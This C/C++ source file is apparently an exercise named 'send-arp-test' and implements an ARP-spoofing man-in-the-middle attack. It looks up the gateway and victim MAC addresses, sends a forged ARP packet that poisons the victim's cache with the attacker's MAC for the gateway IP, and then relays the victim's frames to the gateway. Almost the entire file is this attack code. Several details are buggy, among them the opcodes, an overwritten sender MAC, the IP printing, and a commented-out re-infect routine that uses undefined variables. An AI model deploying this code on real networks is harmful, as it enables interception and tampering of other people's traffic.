
#include <stdio.h>
#include <stdint.h>
#include "hdr.h"
#include <pcap.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

#pragma pack(push, 1)
typedef struct ARP_Packet{
    Ether eth;
    ARP arp;
}ARP_packet;
typedef struct EthIP{
    Ether eth2;
    IP ip2;
}EthIP;
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <victim ip> <gateway ip>\n");
    printf("sample: send-arp-test wlan0\n");
}

uint32_t get_ip(char *ip_string){
    unsigned int a, b, c, d;
    sscanf(ip_string,"%u.%u.%u.%u", &a, &b, &c, &d);
    return ((a << 24) | (b << 16) | (c << 8) | d);
}

uint32_t get_my_ip(char *dev){
    struct ifreq ifr;
    char ipstr[40];
    int s;

    s = socket(AF_INET,SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr)<0)
        printf("ERROR");
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,ipstr,sizeof(struct sockaddr));
    return get_ip(ipstr);
}


void get_attacker_mac(char* dev, uint8_t *mac){

    struct ifreq ifr;
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev,IFNAMSIZ);
    if(ioctl(s,SIOCGIFHWADDR, &ifr) <0)
        printf("ERROR");
    else
        memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
}

void send_request(pcap_t* handle, uint8_t *target_mac, uint32_t target_ip, uint8_t *source_mac, uint32_t source_ip){

    ARP_Packet arp_request;
    arp_request.eth.des[0] = 0xFF;
    arp_request.eth.des[1] = 0xFF;
    arp_request.eth.des[2] = 0xFF;
    arp_request.eth.des[3] = 0xFF;
    arp_request.eth.des[4] = 0xFF;
    arp_request.eth.des[5] = 0xFF;

    memset(arp_request.eth.des, 0xFF, 6);

    memcpy(arp_request.eth.src,source_mac,sizeof(uint8_t)*6);
    arp_request.eth.pkt_type = htons(0x0806);

    arp_request.arp.hd_type = htons(0x0001);
    arp_request.arp.prc_type = htons(0x0800);
    arp_request.arp.hd_addr_len = 0x06;
    arp_request.arp.prc_addr_len = 0x04;
    arp_request.arp.opcode = htons(0x0001);

    memcpy(arp_request.arp.src_mac,source_mac,sizeof(uint8_t)*6);
    arp_request.arp.src_ip = htonl(source_ip);

    memset(arp_request.arp.src_mac, 0xFF, 6);
    arp_request.arp.tag_ip = htonl(target_ip);


    while(true){
        struct pcap_pkthdr* header;
        const u_char* data;
        int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_request), sizeof(ARP_Packet));
        if (res2 != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
        }

        int res = pcap_next_ex(handle, &header, &data);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
        }
        ARP_Packet *capture = (ARP_Packet*)data;
        if(ntohs(capture->eth.pkt_type) == 0x0806){
            if(ntohs(capture->arp.opcode) == 0x0002){
                if(ntohl(capture->arp.src_ip) == target_ip){
                    memcpy(target_mac,capture->arp.src_mac,sizeof(uint8_t)*6);
                    break;
                }
            }
        }
    }
}

void send_arp_reply(pcap_t* handle, uint8_t victim_mac[],uint8_t attacker_mac[],uint32_t gateway_ip,uint32_t victim_ip){
    ARP_Packet arp_reply;
    memcpy(arp_reply.eth.des,victim_mac,sizeof(uint8_t)*6);
    memcpy(arp_reply.eth.src,attacker_mac,sizeof(uint8_t)*6);
    arp_reply.eth.pkt_type = htons(0x0806);

    arp_reply.arp.hd_type = htons(0x0001);
    arp_reply.arp.prc_type = htons(0x0800);
    arp_reply.arp.hd_addr_len = 0x06;
    arp_reply.arp.prc_addr_len = 0x04;
    arp_reply.arp.opcode = htons(0x0001);

    memcpy(arp_reply.arp.src_mac,attacker_mac,sizeof(uint8_t)*6);
    arp_reply.arp.src_ip = htonl(gateway_ip);
    memcpy(arp_reply.arp.tag_mac,victim_mac,sizeof(uint8_t)*6);
    arp_reply.arp.tag_ip = htonl(victim_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_reply), sizeof(ARP_Packet));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}
//void re_infect(Ether * eth, pcap_t* handle, const char* data,uint8_t *victim_mac, uint8_t *attacker_mac, uint32_t gateway_ip, uint32_t victim_ip){

//    ARP_Packet* arp = (ARP_Packet*)data;
//    if(ntohl(arp->arp.tag_ip) == gateway_ip){
//        if(ntohs(arp->arp.opcode) == 0x0001){   //victim send to gateway are you victim?
//            send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);
//            printf("Send ARP reply Packet\n");
//        }
//        else{   //victim send reply packet
//            if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
//                memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
//                memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
//                int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
//                if (res2 != 0) {
//                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
//                }
//            }
//        }
//    }
//    else{   // victim send to me ARP are you?
//        if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
//            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
//            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
//            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
//            if (res2 != 0) {
//                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
//            }
//        }
//    }
//}


void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, uint8_t *gateway_mac, uint32_t gateway_ip, uint32_t victim_ip){

    while(true){
        struct pcap_pkthdr* header;
        const u_char* data;
        int res = pcap_next_ex(handle, &header, &data);
        if(res == 0) continue;
        if(res == -1 || res == -2){
            printf("pcap_next_ex return %d(%s)\n",res, pcap_geterr(handle));
        }

        Ether* eth = (Ether *)data;

        if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
            memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
            int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
            if (res2 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
            }
        }
    }
}

int main(int argc, char* argv[]){

    if (argc != 4) {
        usage();
        return -1;
    }
    uint8_t victim_mac[6];
    uint8_t attacker_mac[6];
    uint8_t gateway_mac[6];
    uint32_t attacker_ip;
    uint32_t gateway_ip;
    uint32_t victim_ip;

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    victim_ip = get_ip(argv[2]);
    printf("Get victim IP : %d.%d.%d.%d\n",ntohl(victim_ip) & 0xFF, ntohl(victim_ip <<8)&0xFF,ntohl(victim_ip <<16)&0xFF,ntohl(victim_ip <<24)&0xFF);
    gateway_ip = get_ip(argv[3]);
    printf("GET gateway IP : %d.%d.%d.%d\n",ntohl(gateway_ip) & 0xFF, ntohl(gateway_ip <<8)&0xFF,ntohl(gateway_ip <<16)&0xFF,ntohl(gateway_ip <<24)&0xFF);

    attacker_ip = get_my_ip(dev);
    printf("Get device IP : %d.%d.%d.%d\n",ntohl(attacker_ip)&0xFF,ntohl(attacker_ip<<8)&0xFF,ntohl(attacker_ip<<16)&0xFF,ntohl(attacker_ip<<24)&0xFF);


    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    printf("Open handle\n");

    get_attacker_mac(dev,attacker_mac);
    printf("Get attacker MAC : %02x:%02x:%02x:%02x:%02x:%02x \n",attacker_mac[0], attacker_mac[1],attacker_mac[2],attacker_mac[3],attacker_mac[4],attacker_mac[5]);
    send_request(handle,gateway_mac,gateway_ip,attacker_mac,attacker_ip);
    printf("Get gateway MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",gateway_mac[0], gateway_mac[1],gateway_mac[2],gateway_mac[3],gateway_mac[4],gateway_mac[5]);

    send_request(handle,victim_mac,victim_ip,attacker_mac,attacker_ip);
    printf("Get victim MAC : %02x:%02x:%02x:%02x:%02x:%02x\n",victim_mac[0], victim_mac[1],victim_mac[2],victim_mac[3],victim_mac[4],victim_mac[5]);
    send_arp_reply(handle,victim_mac,attacker_mac,gateway_ip,victim_ip);

    packet_relay(handle,attacker_mac,victim_mac,gateway_mac,gateway_ip,victim_ip);

    pcap_close(handle);
}
